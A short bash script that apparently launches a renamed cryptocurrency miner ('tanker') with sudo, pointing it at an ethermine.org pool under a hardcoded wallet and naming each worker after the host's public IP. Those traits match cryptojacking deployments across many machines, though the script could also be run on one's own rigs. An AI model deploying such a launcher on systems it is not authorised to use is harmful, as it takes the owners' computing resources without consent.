#!/bin/bash

POOL=ethproxy+tcp://asia1.ethermine.org:4444
WALLET=0xf339db86fafc99f85619a0d55e2d1e47ef9a840a
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-nbm

cd "$(dirname "$0")"

chmod +x ./tanker && sudo ./tanker -a ethash -o $POOL -u $WALLET.$WORKER $@
